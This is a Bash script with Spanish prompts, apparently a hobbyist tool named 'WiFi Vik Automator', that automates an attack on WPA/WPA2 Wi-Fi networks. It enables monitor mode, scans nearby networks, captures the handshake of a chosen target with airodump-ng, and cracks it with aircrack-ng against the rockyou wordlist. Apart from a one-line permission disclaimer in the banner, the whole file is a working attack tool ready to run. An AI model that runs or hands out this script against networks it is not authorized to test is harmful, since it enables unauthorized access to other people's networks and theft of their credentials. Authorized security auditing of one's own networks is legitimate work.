#!/bin/bash
# ===========================================================
#                 WiFi Vik Automator
#         "Hack the planet... Legally!"
# ===========================================================

# Colores para la terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin color

# Verifica si el usuario es root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}Por favor, ejecuta este script como root.${NC}"
   exit 1
fi

# Bienvenida
echo -e "${GREEN}Bienvenido a Wifi Vik - Automatizador WPA/WPA2${NC}"
echo -e "${YELLOW}Nota: Usa esto solo para redes propias o con permiso.${NC}\n"
sleep 10

# Paso 1: Seleccionar la interfaz WiFi
clear
echo -e "${YELLOW}Paso 1: Selección de interfaz WiFi.${NC}"
iwconfig
read -p "Introduce tu interfaz WiFi (ejemplo: wlan0): " interface
sleep 10

# Paso 2: Activar modo monitor
clear
echo -e "${YELLOW}Paso 2: Activando modo monitor en la interfaz seleccionada.${NC}"
airmon-ng start "$interface"
interface_mon="${interface}mon"

# Verificar modo monitor
if iwconfig $interface_mon | grep -q "Mode:Monitor"; then
    echo -e "${GREEN}Modo monitor activado: $interface_mon${NC}"
else
    echo -e "${RED}Error: No se pudo activar el modo monitor.${NC}"
    exit 1
fi
sleep 10

# Paso 3: Escanear redes
clear
echo -e "${YELLOW}Paso 3: Escaneando redes cercanas.${NC}"
echo -e "Mostrando redes en tiempo real. Presiona Ctrl+C cuando encuentres la red objetivo."
sleep 10
airodump-ng "$interface_mon"

# Solicitar datos de la red seleccionada
clear
echo -e "${YELLOW}Introduce los datos de la red seleccionada para continuar.${NC}"
read -p "Introduce el BSSID de la red objetivo: " bssid
read -p "Introduce el canal (CH) de la red objetivo: " channel
read -p "Introduce el ESSID de la red objetivo: " essid
sleep 10

# Paso 4: Captura de paquetes
clear
echo -e "${YELLOW}Paso 4: Capturando paquetes para la red seleccionada.${NC}"
echo -e "Iniciando captura de paquetes para $essid en el canal $channel."
airodump-ng --bssid "$bssid" -c "$channel" -w capture --output-format cap "$interface_mon" &
echo -e "${YELLOW}Esperando handshake... Esto puede tardar unos minutos.${NC}"
sleep 40
pkill -f "airodump-ng"

# Verificar si se capturó el handshake
clear
echo -e "${YELLOW}Verificando si se capturó el handshake...${NC}"
if [[ ! -f capture-01.cap ]]; then
    echo -e "${RED}No se capturó ningún handshake.${NC}"
    exit 1
fi

echo -e "${GREEN}Handshake capturado exitosamente.${NC}"
sleep 10

# Paso 5: Crackear la contraseña
clear
echo -e "${YELLOW}Paso 5: Intentando crackear el handshake.${NC}"
read -p "¿Quieres intentar crackear el handshake? (s/n): " crack_choice
if [[ "$crack_choice" == "s" ]]; then
    read -p "Introduce la ruta al diccionario (default: /usr/share/wordlists/rockyou.txt): " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
    echo -e "${YELLOW}Crackeando el handshake con $wordlist... Esto puede tardar dependiendo del tamaño del diccionario.${NC}"
    aircrack-ng -w "$wordlist" -b "$bssid" capture-01.cap
else
    echo -e "${YELLOW}Saltando crackeo.${NC}"
fi
sleep 10

# Paso 6: Restaurar modo managed
clear
echo -e "${YELLOW}Paso 6: Restaurando la interfaz al modo managed.${NC}"
read -p "¿Quieres restaurar la interfaz al modo managed? (s/n): " restore_choice
if [[ "$restore_choice" == "s" ]]; then
    echo -e "Desactivando la interfaz $interface_mon..."
    sudo ip link set "$interface_mon" down

    echo -e "Cambiando $interface_mon a modo managed..."
    sudo iwconfig "$interface_mon" mode managed

    echo -e "Reactivando la interfaz $interface_mon..."
    sudo ip link set "$interface_mon" up

    echo -e "Estado de la interfaz:${NC}"
    iwconfig "$interface_mon"
    echo -e "${GREEN}La interfaz $interface_mon ha vuelto al modo managed.${NC}"
else
    echo -e "${YELLOW}Saltando restauración de modo managed.${NC}"
fi

# Finalización
echo -e "${GREEN}¡Proceso completado!${NC}"
sleep 10
exit 0
